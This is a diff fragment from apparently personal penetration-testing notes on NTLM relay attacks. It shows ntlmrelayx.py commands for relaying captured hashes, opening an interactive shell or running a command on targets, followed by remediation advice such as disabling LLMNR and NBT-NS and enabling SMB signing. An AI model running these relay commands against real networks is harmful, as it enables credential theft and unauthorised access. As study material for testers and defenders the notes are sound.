@@ -36,7 +36,7 @@ netlmrelayx.py -tf targets.txt -smb2support -I  //interactive shell - connect to
 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami   //run one command  
 \\10.1.1.1  --- kali ip event trigger on victim - should successfully capture and relay users hash  
 
-**Remediation**: Disable LLLMNS and NBT-NS, strong passwor policy 
+**Remediation**: Disable LLLMNS and NBT-NS, strong passwor policy  
 **Prevent relays**: enable SMB signing, LAPS service for admin access  
 
 
